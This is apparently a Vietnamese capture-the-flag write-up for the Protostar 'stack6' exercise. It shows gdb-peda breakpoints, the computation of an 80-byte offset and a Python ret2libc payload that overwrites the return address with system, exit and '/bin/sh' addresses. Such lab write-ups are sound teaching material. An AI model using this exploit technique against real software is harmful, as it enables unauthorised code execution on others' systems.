#1-Stack6
- Đầu tiên em thử chạy gdb xem flow chương trình, kiểm tra checksec thì thấy tất cả cơ chế bảo vệ đều tắt nên em dùng ret2libc đề overflow

- Ý tưởng: Đưa địa chỉ shell code vào return để có thể thực thi exploit
![Screenshot 2022-03-22 190604](https://i.imgur.com/uV62vM0.png)
![stack](https://i.imgur.com/lwPqKh1.png)

- Đầu tiên cần tìm khoảng byte tràn xem hàm getpath đã:
![Screenshot 2022-03-22 190912](https://i.imgur.com/ieTZaHQ.png)
- Đặt breakpoint vào get và ret để xem 

```
gdb-peda$ b* 0x080484a4
Breakpoint 1 at 0x80484a4: file stack6/stack6.c, line 13.
gdb-peda$ b* 0x080484f9
Breakpoint 2 at 0x80484f9: file stack6/stack6.c, line 23.
gdb-peda$ r
```
- Địa chỉ buffer : 
```
>>> hex(0xffffd0f8-0x4c)
'0xffffd0ac'
```
- Địa chỉ return : 0xffffd0fc
- Khoảng cách:
```
>>>0xffffd0fc-0xffffd0ac
80
```
- Địa chỉ của system, exit, bin/sh
![Screenshot 2022-03-22 191456](https://i.imgur.com/eL142V0.png)
- Đầy đủ hết rồi bây giờ viết payload thôi.
```
import struct
sys = 0xf7e01cc0
exit = 0xf7df4640
sh = 0xf7f4cb62
payload = ""
payload += 'A'*80
payload += struct.pack("<I",sys)
payload += struct.pack("<I",exit)
payload += struct.pack("<I",sh)
print payload
```
![Screenshot 2022-03-22 191633](https://i.imgur.com/VivCqLA.png)